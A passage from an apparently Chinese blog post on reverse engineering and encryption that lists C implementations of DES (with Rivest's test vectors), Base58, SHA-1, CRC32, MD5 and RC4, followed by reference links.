PC1[] = {    57, 49, 41, 33, 25, 17,  9,     1, 58, 50, 42, 34, 26, 18,    10,  2, 59, 51, 43, 35, 27,    19, 11,  3, 60, 52, 44, 36,        63, 55, 47, 39, 31, 23, 15,     7, 62, 54, 46, 38, 30, 22,    14,  6, 61, 53, 45, 37, 29,    21, 13,  5, 28, 20, 12,  4};/* Permuted Choice 2 Table */static char PC2[] = {    14, 17, 11, 24,  1,  5,     3, 28, 15,  6, 21, 10,    23, 19, 12,  4, 26,  8,    16,  7, 27, 20, 13,  2,    41, 52, 31, 37, 47, 55,    30, 40, 51, 45, 33, 48,    44, 49, 39, 56, 34, 53,    46, 42, 50, 36, 29, 32};/* Iteration Shift Array */static char iteration_shift[] = { /* 1   2   3   4   5   6   7   8   9  10  11  12  13  14  15  16 */    1,  1,  2,  2,  2,  2,  2,  2,  1,  2,  2,  2,  2,  2,  2,  1};/* * The DES function * input: 64 bit message * key: 64 bit key for encryption/decryption * mode: 'e' = encryption; 'd' = decryption */uint64_t des(uint64_t input, uint64_t key, char mode) {        int i, j;        /* 8 bits */    char row, column;        /* 28 bits */    uint32_t C                  = 0;    uint32_t D                  = 0;        /* 32 bits */    uint32_t L                  = 0;    uint32_t R                  = 0;    uint32_t s_output           = 0;    uint32_t f_function_res     = 0;    uint32_t temp               = 0;        /* 48 bits */    uint64_t sub_key[16]        = {0};    uint64_t s_input            = 0;        /* 56 bits */    uint64_t permuted_choice_1  = 0;    uint64_t permuted_choice_2  = 0;        /* 64 bits */    uint64_t init_perm_res      = 0;    uint64_t inv_init_perm_res  = 0;    uint64_t pre_output         = 0;        /* initial permutation */    for (i = 0; i &lt; 64; i++) {                init_perm_res &lt;&lt;= 1;        init_perm_res |= (input &gt;&gt; (64-IP[i])) &amp; LB64_MASK;            }        L = (uint32_t) (init_perm_res &gt;&gt; 32) &amp; L64_MASK;    R = (uint32_t) init_perm_res &amp; L64_MASK;            /* initial key schedule calculation */    for (i = 0; i &lt; 56; i++) {                permuted_choice_1 &lt;&lt;= 1;        permuted_choice_1 |= (key &gt;&gt; (64-PC1[i])) &amp; LB64_MASK;    }        C = (uint32_t) ((permuted_choice_1 &gt;&gt; 28) &amp; 0x000000000fffffff);    D = (uint32_t) (permuted_choice_1 &amp; 0x000000000fffffff);        /* Calculation of the 16 keys */    for (i = 0; i&lt; 16; i++) {                /* key schedule */        // shifting Ci and Di        for (j = 0; j &lt; iteration_shift[i]; j++) {                        C = 0x0fffffff &amp; (C &lt;&lt; 1) | 0x00000001 &amp; (C &gt;&gt; 27);            D = 0x0fffffff &amp; (D &lt;&lt; 1) | 0x00000001 &amp; (D &gt;&gt; 27);                    }                permuted_choice_2 = 0;        permuted_choice_2 = (((uint64_t) C) &lt;&lt; 28) | (uint64_t) D ;                sub_key[i] = 0;                for (j = 0; j &lt; 48; j++) {                        sub_key[i] &lt;&lt;= 1;            sub_key[i] |= (permuted_choice_2 &gt;&gt; (56-PC2[j])) &amp; LB64_MASK;                    }            }        for (i = 0; i &lt; 16; i++) {                /* f(R,k) function */        s_input = 0;                for (j = 0; j&lt; 48; j++) {                        s_input &lt;&lt;= 1;            s_input |= (uint64_t) ((R &gt;&gt; (32-E[j])) &amp; LB32_MASK);                    }                /*          * Encryption/Decryption          * XORing expanded Ri with Ki         */        if (mode == 'd') {            // decryption            s_input = s_input ^ sub_key[15-i];                    } else {            // encryption            s_input = s_input ^ sub_key[i];                    }                /* S-Box Tables */        for (j = 0; j &lt; 8; j++) {            // 00 00 RCCC CR00 00 00 00 00 00 s_input            // 00 00 1000 0100 00 00 00 00 00 row mask            // 00 00 0111 1000 00 00 00 00 00 column mask                        row = (char) ((s_input &amp; (0x0000840000000000 &gt;&gt; 6*j)) &gt;&gt; 42-6*j);            row = (row &gt;&gt; 4) | row &amp; 0x01;                        column = (char) ((s_input &amp; (0x0000780000000000 &gt;&gt; 6*j)) &gt;&gt; 43-6*j);                        s_output &lt;&lt;= 4;            s_output |= (uint32_t) (S[j][16*row + column] &amp; 0x0f);                    }                f_function_res = 0;                for (j = 0; j &lt; 32; j++) {                        f_function_res &lt;&lt;= 1;            f_function_res |= (s_output &gt;&gt; (32 - P[j])) &amp; LB32_MASK;                    }                temp = R;        R = L ^ f_function_res;        L = temp;            }        pre_output = (((uint64_t) R) &lt;&lt; 32) | (uint64_t) L;            /* inverse initial permutation */    for (i = 0; i &lt; 64; i++) {                inv_init_perm_res &lt;&lt;= 1;        inv_init_perm_res |= (pre_output &gt;&gt; (64-PI[i])) &amp; LB64_MASK;            }        return inv_init_perm_res;    }int main(int argc, const char * argv[]) {    int i;        uint64_t input = 0x9474B8E8C73BCA7D;    uint64_t key = 0x0000000000000000;    uint64_t result = input;        /*     * TESTING IMPLEMENTATION OF DES     * Ronald L. Rivest      * X0:  9474B8E8C73BCA7D     * X16: 1B1A2DDB4C642438     *     * OUTPUT:     * E: 8da744e0c94e5e17     * D: 0cdb25e3ba3c6d79     * E: 4784c4ba5006081f     * D: 1cf1fc126f2ef842     * E: e4be250042098d13     * D: 7bfc5dc6adb5797c     * E: 1ab3b4d82082fb28     * D: c1576a14de707097     * E: 739b68cd2e26782a     * D: 2a59f0c464506edb     * E: a5c39d4251f0a81e     * D: 7239ac9a6107ddb1     * E: 070cac8590241233     * D: 78f87b6e3dfecf61     * E: 95ec2578c2c433f0     * D: 1b1a2ddb4c642438  &lt;-- X16     */    for (i = 0; i &lt; 16; i++) {                if (i%2 == 0) {                        result = des(result, result, 'e');            printf (\"E: %016llx\\n\", result);                    } else {                        result = des(result, result, 'd');            printf (\"D: %016llx\\n\", result);                    }    }        //result = des(input, key, 'e');    //printf (\"E: %016llx\\n\", result);        //result = des(result, key, 'd');    //printf (\"D: %016llx\\n\", result);        exit(0);    }\n\n\n\nBASE58#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt; unsigned char* en_base58(unsigned char* input)  // 编码{    static char* nb58 = (char*)\"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\";    size_t len = strlen((char*)input);    size_t rlen = (len / 2 + 1) * 3;    unsigned char* ret = (unsigned char*)malloc(rlen + len);    unsigned char* src = ret + rlen;    unsigned char* rptr = ret + rlen;    unsigned char* ptr, * e = src + len - 1;    size_t i;    memcpy(src, input, len);    while (src &lt;= e)    {        if (*src)        {            unsigned char rest = 0;            ptr = src;            while (ptr &lt;= e)            {                unsigned int c = rest * 256;                rest = (c + *ptr) % 58;                *ptr = (c + *ptr) / 58;                ptr++;            }            --rptr;            *rptr = nb58[rest];        }        else        {            src++;        }    }    for (i = 0; i &lt; ret + rlen - rptr; i++)        ret[i] = rptr[i];    ret[i] = 0;    return ret;} bool de_base58(unsigned char* src)  // 解码{    static char b58n[] =    {        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,        -1,  0,  1,  2,  3,  4,  5,  6,  7,  8, -1, -1, -1, -1, -1, -1,        -1,  9, 10, 11, 12, 13, 14, 15, 16, -1, 17, 18, 19, 20, 21, -1,        22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, -1, -1, -1, -1, -1,        -1, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, -1, 44, 45, 46,        47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, -1, -1, -1, -1, -1,        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,    };    size_t len = strlen((char*)src);    size_t rlen = (len / 4 + 1) * 3;    unsigned char* ret = (unsigned char*)malloc(rlen);    unsigned char* rptr = ret + rlen;    size_t i;    unsigned char* ptr;    for (i = 0; i &lt; len; i++)    {        char rest = b58n[src[i]];        if (rest &lt; 0)        {            free(ret);            return NULL;        }        for (ptr = ret + rlen - 1; ptr &gt;= rptr; ptr--)        {            unsigned int c = rest + *ptr * 58;            *ptr = c % 256;            rest = c / 256;        }        if (rest &gt; 0)        {            rptr--;            if (rptr &lt; ret)            {                free(ret);                return NULL;            }            *rptr = rest;        }    }    for (i = 0; i &lt; ret + rlen - rptr; i++)        ret[i] = rptr[i];    ret[i] = 0;    memcpy(src, ret, strlen((char*)src));} int main(){    char str[] = \"9EGJCxbxRGT\";    printf(\"%s\\n\", en_base58((unsigned char*)\"12345678\"));    de_base58((unsigned char*)str);    printf(\"%s\", str);    getchar();    return 0;}\n\nSHA1#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt; #define rol(x,y) ((x&lt;&lt;y)|(x&gt;&gt;(32-y)))  //循环左移 //一次循环过程，str为填充后的数据或是数据中的一部分 void round(unsigned char str[64],unsigned int h[5]){\tunsigned int a, b, c, d, e,tmp,w[80];\tunsigned int i;\tfor(i=0;i&lt;16;i++){\t\tw[i]=((unsigned int)str[i*4]&lt;&lt;24)|(((unsigned int)str[i*4+1])&lt;&lt;16)|\t\t\t\t\t\t(((unsigned int)str[i*4+2])&lt;&lt;8)|(((unsigned int)str[i*4+3])&lt;&lt;0);\t}\tfor (i=16;i&lt;80;i++ ){\t\ttmp = w[i-3]^w[i-8]^w[i-14]^w[i-16];\t\tw[i]=rol(tmp,1);    }        a=h[0];b=h[1];c=h[2];d=h[3];e=h[4];    for(i=0;i&lt;80;i++){    \tswitch(i/20){    \t\tcase 0:tmp=rol(a,5)+((b&amp;c)|(d&amp;~b))+e+w[i]+0x5a827999;break;    \t\tcase 1:tmp=rol(a,5)+(b^c^d)+e+w[i]+0x6ed9eba1;break;    \t\tcase 2:tmp=rol(a,5)+((b&amp;c)|(b&amp;d)|(c&amp;d))+e+w[i] +0x8f1bbcdc;break;    \t\tcase 3:tmp=rol(a,5)+(b^c^d)+e+w[i] + 0xca62c1d6;break;\t\t}\t\te=d;d=c;\t\tc=rol(b,30);\t\tb=a;a=tmp;\t}\th[0]+=a;h[1]+=b;h[2]+=c;h[3]+=d;h[4]+=e;}//sha-1算法 void sha1(unsigned char*input,long long len,unsigned char*output){\tunsigned char temp[64];\tunsigned int h[5]={0x67452301,0xefcdab89,0x98badcfe,0x10325476,0xc3d2e1f0};\tunsigned int i,n=len,tmp;\twhile(n&gt;=64){\t\tmemcpy(temp,input+len-n,64);\t\tround(temp,h);\t\tn-=64;\t}\t\tif(n&gt;=56){\t\tmemset(temp,0,64);\t\tmemcpy(temp,input+len-n,n);temp[n]=128;\t\tround(temp,h);\t\tmemset(temp,0,64);\t\tfor(i=56;i&lt;64;i++)\t\t\ttemp[i]=((len*8)&gt;&gt;(63-i)*8)&amp;0xff;\t\tround(temp,h);\t}\telse{\t\tmemset(temp,0,64);\t\tmemcpy(temp,input+len-n,n);temp[n]=128;\t\tfor(i=56;i&lt;64;i++)\t\t\ttemp[i]=((len*8)&gt;&gt;(63-i)*8)&amp;0xff;\t\tround(temp,h);\t\t}\t\tfor(i=0;i&lt;20;i++){\t\ttmp=(h[i/4]&gt;&gt;((3-i%4)*8))&amp;0xff;\t\tsprintf((char*)output+2*i,\"%02x\",tmp);\t}}//测试 int main(){\tunsigned char input[]=\"this is a test aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",output[40]={0};\tsha1(input,strlen((char*)input),output);\tprintf(\"%s\\n\",output);}\n\nCRC32/* crc32.c   Copyright (C) 2009-2024 Free Software Foundation, Inc.   This file is part of the libiberty library.   This file is free software; you can redistribute it and/or modify   it under the terms of the GNU General Public License as published by   the Free Software Foundation; either version 2 of the License, or   (at your option) any later version.   In addition to the permissions in the GNU General Public License, the   Free Software Foundation gives you unlimited permission to link the   compiled version of this file into combinations with other programs,   and to distribute those combinations without any restriction coming   from the use of this file.  (The General Public License restrictions   do apply in other respects; for example, they cover modification of   the file, and distribution when not linked into a combined   executable.)   This program is distributed in the hope that it will be useful,   but WITHOUT ANY WARRANTY; without even the implied warranty of   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the   GNU General Public License for more details.   You should have received a copy of the GNU General Public License   along with this program; if not, write to the Free Software   Foundation, Inc., 51 Franklin Street - Fifth Floor, Boston, MA 02110-1301, USA.*/#ifdef HAVE_CONFIG_H#include \"config.h\"#endif#include \"libiberty.h\"/* This table was generated by the following program.   #include &lt;stdio.h&gt;   int   main ()   {     unsigned int i, j;     unsigned int c;     int table[256];     for (i = 0; i &lt; 256; i++)       {\t for (c = i &lt;&lt; 24, j = 8; j &gt; 0; --j)\t   c = c &amp; 0x80000000 ? (c &lt;&lt; 1) ^ 0x04c11db7 : (c &lt;&lt; 1);\t table[i] = c;       }     printf (\"static const unsigned int crc32_table[] =\\n{\\n\");     for (i = 0; i &lt; 256; i += 4)       {\t printf (\"  0x%08x, 0x%08x, 0x%08x, 0x%08x\",\t\t table[i + 0], table[i + 1], table[i + 2], table[i + 3]);\t if (i + 4 &lt; 256)\t   putchar (',');\t putchar ('\\n');       }     printf (\"};\\n\");     return 0;   }   For more information on CRC, see, e.g.,   http://www.ross.net/crc/download/crc_v3.txt.  */static const unsigned int crc32_table[] ={  0x00000000, 0x04c11db7, 0x09823b6e, 0x0d4326d9,  0x130476dc, 0x17c56b6b, 0x1a864db2, 0x1e475005,  0x2608edb8, 0x22c9f00f, 0x2f8ad6d6, 0x2b4bcb61,  0x350c9b64, 0x31cd86d3, 0x3c8ea00a, 0x384fbdbd,  0x4c11db70, 0x48d0c6c7, 0x4593e01e, 0x4152fda9,  0x5f15adac, 0x5bd4b01b, 0x569796c2, 0x52568b75,  0x6a1936c8, 0x6ed82b7f, 0x639b0da6, 0x675a1011,  0x791d4014, 0x7ddc5da3, 0x709f7b7a, 0x745e66cd,  0x9823b6e0, 0x9ce2ab57, 0x91a18d8e, 0x95609039,  0x8b27c03c, 0x8fe6dd8b, 0x82a5fb52, 0x8664e6e5,  0xbe2b5b58, 0xbaea46ef, 0xb7a96036, 0xb3687d81,  0xad2f2d84, 0xa9ee3033, 0xa4ad16ea, 0xa06c0b5d,  0xd4326d90, 0xd0f37027, 0xddb056fe, 0xd9714b49,  0xc7361b4c, 0xc3f706fb, 0xceb42022, 0xca753d95,  0xf23a8028, 0xf6fb9d9f, 0xfbb8bb46, 0xff79a6f1,  0xe13ef6f4, 0xe5ffeb43, 0xe8bccd9a, 0xec7dd02d,  0x34867077, 0x30476dc0, 0x3d044b19, 0x39c556ae,  0x278206ab, 0x23431b1c, 0x2e003dc5, 0x2ac12072,  0x128e9dcf, 0x164f8078, 0x1b0ca6a1, 0x1fcdbb16,  0x018aeb13, 0x054bf6a4, 0x0808d07d, 0x0cc9cdca,  0x7897ab07, 0x7c56b6b0, 0x71159069, 0x75d48dde,  0x6b93dddb, 0x6f52c06c, 0x6211e6b5, 0x66d0fb02,  0x5e9f46bf, 0x5a5e5b08, 0x571d7dd1, 0x53dc6066,  0x4d9b3063, 0x495a2dd4, 0x44190b0d, 0x40d816ba,  0xaca5c697, 0xa864db20, 0xa527fdf9, 0xa1e6e04e,  0xbfa1b04b, 0xbb60adfc, 0xb6238b25, 0xb2e29692,  0x8aad2b2f, 0x8e6c3698, 0x832f1041, 0x87ee0df6,  0x99a95df3, 0x9d684044, 0x902b669d, 0x94ea7b2a,  0xe0b41de7, 0xe4750050, 0xe9362689, 0xedf73b3e,  0xf3b06b3b, 0xf771768c, 0xfa325055, 0xfef34de2,  0xc6bcf05f, 0xc27dede8, 0xcf3ecb31, 0xcbffd686,  0xd5b88683, 0xd1799b34, 0xdc3abded, 0xd8fba05a,  0x690ce0ee, 0x6dcdfd59, 0x608edb80, 0x644fc637,  0x7a089632, 0x7ec98b85, 0x738aad5c, 0x774bb0eb,  0x4f040d56, 0x4bc510e1, 0x46863638, 0x42472b8f,  0x5c007b8a, 0x58c1663d, 0x558240e4, 0x51435d53,  0x251d3b9e, 0x21dc2629, 0x2c9f00f0, 0x285e1d47,  0x36194d42, 0x32d850f5, 0x3f9b762c, 0x3b5a6b9b,  0x0315d626, 0x07d4cb91, 0x0a97ed48, 0x0e56f0ff,  0x1011a0fa, 0x14d0bd4d, 0x19939b94, 0x1d528623,  0xf12f560e, 0xf5ee4bb9, 0xf8ad6d60, 0xfc6c70d7,  0xe22b20d2, 0xe6ea3d65, 0xeba91bbc, 0xef68060b,  0xd727bbb6, 0xd3e6a601, 0xdea580d8, 0xda649d6f,  0xc423cd6a, 0xc0e2d0dd, 0xcda1f604, 0xc960ebb3,  0xbd3e8d7e, 0xb9ff90c9, 0xb4bcb610, 0xb07daba7,  0xae3afba2, 0xaafbe615, 0xa7b8c0cc, 0xa379dd7b,  0x9b3660c6, 0x9ff77d71, 0x92b45ba8, 0x9675461f,  0x8832161a, 0x8cf30bad, 0x81b02d74, 0x857130c3,  0x5d8a9099, 0x594b8d2e, 0x5408abf7, 0x50c9b640,  0x4e8ee645, 0x4a4ffbf2, 0x470cdd2b, 0x43cdc09c,  0x7b827d21, 0x7f436096, 0x7200464f, 0x76c15bf8,  0x68860bfd, 0x6c47164a, 0x61043093, 0x65c52d24,  0x119b4be9, 0x155a565e, 0x18197087, 0x1cd86d30,  0x029f3d35, 0x065e2082, 0x0b1d065b, 0x0fdc1bec,  0x3793a651, 0x3352bbe6, 0x3e119d3f, 0x3ad08088,  0x2497d08d, 0x2056cd3a, 0x2d15ebe3, 0x29d4f654,  0xc5a92679, 0xc1683bce, 0xcc2b1d17, 0xc8ea00a0,  0xd6ad50a5, 0xd26c4d12, 0xdf2f6bcb, 0xdbee767c,  0xe3a1cbc1, 0xe760d676, 0xea23f0af, 0xeee2ed18,  0xf0a5bd1d, 0xf464a0aa, 0xf9278673, 0xfde69bc4,  0x89b8fd09, 0x8d79e0be, 0x803ac667, 0x84fbdbd0,  0x9abc8bd5, 0x9e7d9662, 0x933eb0bb, 0x97ffad0c,  0xafb010b1, 0xab710d06, 0xa6322bdf, 0xa2f33668,  0xbcb4666d, 0xb8757bda, 0xb5365d03, 0xb1f740b4};/*@deftypefn Extension {unsigned int} crc32 (const unsigned char *@var{buf}, @  int @var{len}, unsigned int @var{init})Compute the 32-bit CRC of @var{buf} which has length @var{len}.  Thestarting value is @var{init}; this may be used to compute the CRC ofdata split across multiple buffers by passing the return value of eachcall as the @var{init} parameter of the next.This is used by the @command{gdb} remote protocol for the @samp{qCRC}command.  In order to get the same results as gdb for a block of data,you must pass the first CRC parameter as @code{0xffffffff}.This CRC can be specified as:  Width  : 32  Poly   : 0x04c11db7  Init   : parameter, typically 0xffffffff  RefIn  : false  RefOut : false  XorOut : 0This differs from the \"standard\" CRC-32 algorithm in that the valuesare not reflected, and there is no final XOR value.  These differencesmake it easy to compose the values of multiple blocks.@end deftypefn*/unsigned intxcrc32 (const unsigned char *buf, int len, unsigned int init){  unsigned int crc = init;  while (len--)    {      crc = (crc &lt;&lt; 8) ^ crc32_table[((crc &gt;&gt; 24) ^ *buf) &amp; 255];      buf++;    }  return crc;}\n\nMD5/* * Derived from the RSA Data Security, Inc. MD5 Message-Digest Algorithm * and modified slightly to be functionally identical but condensed into control structures. */#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;typedef struct{    uint64_t size;        // Size of input in bytes    uint32_t buffer[4];   // Current accumulation of hash    uint8_t input[64];    // Input to be used in the next step    uint8_t digest[16];   // Result of algorithm} MD5Context;/* * Constants defined by the MD5 algorithm */#define A 0x67452301#define B 0xefcdab89#define C 0x98badcfe#define D 0x10325476static uint32_t S[] = {7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,                       5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20,                       4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,                       6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21};static uint32_t K[] = {0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,                       0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,                       0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,                       0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,                       0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,                       0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,                       0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,                       0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,                       0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,                       0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,                       0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,                       0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,                       0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,                       0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,                       0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,                       0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391};/* * Padding used to make the size (in bits) of the input congruent to 448 mod 512 */static uint8_t PADDING[] = {0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};/* * Bit-manipulation functions defined by the MD5 algorithm */#define F(X, Y, Z) ((X &amp; Y) | (~X &amp; Z))#define G(X, Y, Z) ((X &amp; Z) | (Y &amp; ~Z))#define H(X, Y, Z) (X ^ Y ^ Z)#define I(X, Y, Z) (Y ^ (X | ~Z))/* * Rotates a 32-bit word left by n bits */uint32_t rotateLeft(uint32_t x, uint32_t n){    return (x &lt;&lt; n) | (x &gt;&gt; (32 - n));}/* * Initialize a context */void md5Init(MD5Context *ctx){    ctx-&gt;size = (uint64_t)0;    ctx-&gt;buffer[0] = (uint32_t)A;    ctx-&gt;buffer[1] = (uint32_t)B;    ctx-&gt;buffer[2] = (uint32_t)C;    ctx-&gt;buffer[3] = (uint32_t)D;}/* * Add some amount of input to the context * * If the input fills out a block of 512 bits, apply the algorithm (md5Step) * and save the result in the buffer. Also updates the overall size. */void md5Update(MD5Context *ctx, uint8_t *input_buffer, size_t input_len){    uint32_t input[16];    unsigned int offset = ctx-&gt;size % 64;    ctx-&gt;size += (uint64_t)input_len;    // Copy each byte in input_buffer into the next space in our context input    for(unsigned int i = 0; i &lt; input_len; ++i){        ctx-&gt;input[offset++] = (uint8_t)*(input_buffer + i);        // If we've filled our context input, copy it into our local array input        // then reset the offset to 0 and fill in a new buffer.        // Every time we fill out a chunk, we run it through the algorithm        // to enable some back and forth between cpu and i/o        if(offset % 64 == 0){            for(unsigned int j = 0; j &lt; 16; ++j){                // Convert to little-endian                // The local variable `input` our 512-bit chunk separated into 32-bit words                // we can use in calculations                input[j] = (uint32_t)(ctx-&gt;input[(j * 4) + 3]) &lt;&lt; 24 |                           (uint32_t)(ctx-&gt;input[(j * 4) + 2]) &lt;&lt; 16 |                           (uint32_t)(ctx-&gt;input[(j * 4) + 1]) &lt;&lt;  8 |                           (uint32_t)(ctx-&gt;input[(j * 4)]);            }            md5Step(ctx-&gt;buffer, input);            offset = 0;        }    }}/* * Pad the current input to get to 448 bytes, append the size in bits to the very end, * and save the result of the final iteration into digest. */void md5Finalize(MD5Context *ctx){    uint32_t input[16];    unsigned int offset = ctx-&gt;size % 64;    unsigned int padding_length = offset &lt; 56 ? 56 - offset : (56 + 64) - offset;    // Fill in the padding and undo the changes to size that resulted from the update    md5Update(ctx, PADDING, padding_length);    ctx-&gt;size -= (uint64_t)padding_length;    // Do a final update (internal to this function)    // Last two 32-bit words are the two halves of the size (converted from bytes to bits)    for(unsigned int j = 0; j &lt; 14; ++j){        input[j] = (uint32_t)(ctx-&gt;input[(j * 4) + 3]) &lt;&lt; 24 |                   (uint32_t)(ctx-&gt;input[(j * 4) + 2]) &lt;&lt; 16 |                   (uint32_t)(ctx-&gt;input[(j * 4) + 1]) &lt;&lt;  8 |                   (uint32_t)(ctx-&gt;input[(j * 4)]);    }    input[14] = (uint32_t)(ctx-&gt;size * 8);    input[15] = (uint32_t)((ctx-&gt;size * 8) &gt;&gt; 32);    md5Step(ctx-&gt;buffer, input);    // Move the result into digest (convert from little-endian)    for(unsigned int i = 0; i &lt; 4; ++i){        ctx-&gt;digest[(i * 4) + 0] = (uint8_t)((ctx-&gt;buffer[i] &amp; 0x000000FF));        ctx-&gt;digest[(i * 4) + 1] = (uint8_t)((ctx-&gt;buffer[i] &amp; 0x0000FF00) &gt;&gt;  8);        ctx-&gt;digest[(i * 4) + 2] = (uint8_t)((ctx-&gt;buffer[i] &amp; 0x00FF0000) &gt;&gt; 16);        ctx-&gt;digest[(i * 4) + 3] = (uint8_t)((ctx-&gt;buffer[i] &amp; 0xFF000000) &gt;&gt; 24);    }}/* * Step on 512 bits of input with the main MD5 algorithm. */void md5Step(uint32_t *buffer, uint32_t *input){    uint32_t AA = buffer[0];    uint32_t BB = buffer[1];    uint32_t CC = buffer[2];    uint32_t DD = buffer[3];    uint32_t E;    unsigned int j;    for(unsigned int i = 0; i &lt; 64; ++i){        switch(i / 16){            case 0:                E = F(BB, CC, DD);                j = i;                break;            case 1:                E = G(BB, CC, DD);                j = ((i * 5) + 1) % 16;                break;            case 2:                E = H(BB, CC, DD);                j = ((i * 3) + 5) % 16;                break;            default:                E = I(BB, CC, DD);                j = (i * 7) % 16;                break;        }        uint32_t temp = DD;        DD = CC;        CC = BB;        BB = BB + rotateLeft(AA + E + K[i] + input[j], S[i]);        AA = temp;    }    buffer[0] += AA;    buffer[1] += BB;    buffer[2] += CC;    buffer[3] += DD;}/* * Functions that run the algorithm on the provided input and put the digest into result. * result should be able to store 16 bytes. */void md5String(char *input, uint8_t *result){    MD5Context ctx;    md5Init(&amp;ctx);    md5Update(&amp;ctx, (uint8_t *)input, strlen(input));    md5Finalize(&amp;ctx);    memcpy(result, ctx.digest, 16);}void md5File(FILE *file, uint8_t *result){    char *input_buffer = malloc(1024);    size_t input_size = 0;    MD5Context ctx;    md5Init(&amp;ctx);    while((input_size = fread(input_buffer, 1, 1024, file)) &gt; 0){        md5Update(&amp;ctx, (uint8_t *)input_buffer, input_size);    }    md5Finalize(&amp;ctx);    free(input_buffer);    memcpy(result, ctx.digest, 16);}void print_hash(uint8_t *p){    for(unsigned int i = 0; i &lt; 16; ++i){        printf(\"%02x\", p[i]);    }    printf(\"\\n\");}int main(int argc, char *argv[]){    uint8_t result[16];    if(argc &gt; 1){        for(int i = 1; i &lt; argc; ++i){            md5String(argv[i], result);            print_hash(result);        }    } else{        md5File(stdin, result);        print_hash(result);    }}\n\nRC4#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;//s表的长度取256#define size 256unsigned char sbox[257] = {0};//初始化s表void init_sbox(unsigned char *key) {    unsigned int i, j, k;    int tmp;    for (i = 0; i &lt; size; i++) {        sbox[i] = i;    }    j = k = 0;    for (i = 0; i &lt; size; i++) {        tmp = sbox[i];        j = (j + tmp + key[k]) % size;        sbox[i] = sbox[j];        sbox[j] = tmp;        if (++k &gt;= strlen((char *) key))k = 0;    }}//加解密函数void enc_dec(unsigned char *key, unsigned char *data) {    int i, j, k, R, tmp;    init_sbox(key);    j = k = 0;    for (i = 0; i &lt; strlen((char *) data); i++) {        j = (j + 1) % size;        k = (k + sbox[j]) % size;        tmp = sbox[j];        sbox[j] = sbox[k];        sbox[k] = tmp;        R = sbox[(sbox[j] + sbox[k]) % size];        data[i] ^= R;    }}int main() {    unsigned char key[100] = {0};    unsigned char data[100] = {0};    printf(\"输入你要加密的字符：\");    scanf(\"%100s\", data);    printf(\"输入密钥：\");    scanf(\"%40s\", key);    enc_dec(key, data);    printf(\"enc: %s\\n\", data);    enc_dec(key, data);    printf(\"dec: %s\\n\", data);    return 0;}\n\n参考链接Pangbai.work [常见加密解密算法]\nmengsuenyan [AES加密算法]\n枫のBlog 密码学——AES/DES加密算法原理介绍\ngcc-mirror c3c\nZunawe MD5\nwindard SM4\ndhuertas DES\nlmshao AES\n侵权请联系删除\n","tags":["Reverse","Encryption"]}]